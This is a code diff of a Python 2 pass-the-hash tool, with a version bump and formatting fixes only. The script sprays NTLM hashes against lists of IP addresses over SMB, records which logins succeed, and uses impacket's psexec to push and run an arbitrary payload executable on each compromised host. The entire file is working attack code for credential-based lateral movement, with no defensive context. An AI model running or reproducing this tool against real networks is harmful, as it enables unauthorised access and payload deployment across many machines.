@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#1.2
+# 1.3
 import psexec
 import time
 import blessings
@@ -10,21 +10,27 @@ import signal
 from impacket.smbconnection import *
 import multiprocessing
 
+
 class timeout:
+
     def __init__(self, seconds, error_message='Timeout'):
         self.seconds = seconds
         self.error_message = error_message
+
     def handle_timeout(self, signum, frame):
         raise Exception(self.error_message)
+
     def __enter__(self):
         signal.signal(signal.SIGALRM, self.handle_timeout)
         signal.alarm(self.seconds)
+
     def __exit__(self, type, value, traceback):
         signal.alarm(0)
 
 t = blessings.Terminal()
 
-def StartPsexec(exeFile,targetusername,psexechash,targetdomain,psexecip):
+
+def StartPsexec(exeFile, targetusername, psexechash, targetdomain, psexecip):
     PSEXEC = psexec.PSEXEC(command="", path="", exeFile=exeFile, copyFile="", protocols=None, username=targetusername,
                            hashes=psexechash, domain=targetdomain, password=None, aesKey=None, doKerberos=False)
     print t.bold_green + "\n[*] Starting Psexec...." + t.normal
@@ -33,6 +39,7 @@ def StartPsexec(exeFile,targetusername,psexechash,targetdomain,psexecip):
         PSEXEC.run(psexecip)
     except SessionError:
         print t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell"
+
 
 def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
     targetsprayhash = []
@@ -44,7 +51,7 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
         targetsprayhash = targethash.split(",")
     else:
         print t.bold_green + "[*] Hash File Selected: " + t.normal + hashfile
-        file = open(hashfile,"r")
+        file = open(hashfile, "r")
         for hash in file:
             targetsprayhash.append(hash.strip("\n"))
 
@@ -53,7 +60,7 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
         targetipseperated = targetips.split(',')
     else:
         print t.bold_green + "[*] IP File Selected: " + t.normal + ipfile
-        file = open(ipfile,"r")
+        file = open(ipfile, "r")
         for ip in file:
             targetipseperated.append(ip.strip("\n"))
 
@@ -74,7 +81,7 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
                 with timeout(8):
                     smb = SMBConnection(ip, ip, sess_port=445)
             except Exception as E:
-                print t.bold_red + "[!!] Timed Out!" +t.normal
+                print t.bold_red + "[!!] Timed Out!" + t.normal
                 print E
                 continue
             try:
@@ -94,14 +101,14 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
         want_to_psexec = raw_input("[*] Run Psexec on Working Hashes? [Y/n]: ")
         if want_to_psexec.lower() == "y" or want_to_psexec == "":
             for hash in workinghashes:
-                psexechash,psexecip = hash.split(",")
-                print exeFile,targetusername,psexechash,targetdomain,psexecip
+                psexechash, psexecip = hash.split(",")
+                print exeFile, targetusername, psexechash, targetdomain, psexecip
                 b = multiprocessing.Process(
-                    target=StartPsexec, args=(exeFile,targetusername,psexechash,targetdomain,psexecip))
+                    target=StartPsexec, args=(exeFile, targetusername, psexechash, targetdomain, psexecip))
                 if __name__ == "__main__":
-                    b.daemon=False
+                    b.daemon = False
                 else:
-                    b.daemon=True
+                    b.daemon = True
                 b.start()
     else:
         print t.bold_red + "[!] No Working Hashes. Exiting..." + t.normal
@@ -109,10 +116,13 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Spray Smb Hashes and Psexec')
-    parser.add_argument("-hashfile", help="Parse Hashes from a File (Hashes Seperated by New Line)",default="")
-    parser.add_argument("-ipfile", help="Parse IP's from a File (IP's Seperated by New Line)",default="")
-    parser.add_argument("-username", help="Set Username",default="")
-    parser.add_argument("-domain", help="Set Domain",default="")
+    parser.add_argument(
+        "-hashfile", help="Parse Hashes from a File (Hashes Seperated by New Line)", default="")
+    parser.add_argument(
+        "-ipfile", help="Parse IP's from a File (IP's Seperated by New Line)", default="")
+    parser.add_argument("-username", help="Set Username", default="")
+    parser.add_argument("-domain", help="Set Domain", default="")
     parser.add_argument("payloadpath", help="Select Payload for Psexec")
     args = parser.parse_args()
-    DoPsexecSpray(args.payloadpath, args.hashfile, args.ipfile, args.username,args.domain)
+    DoPsexecSpray(args.payloadpath, args.hashfile,
+                  args.ipfile, args.username, args.domain)
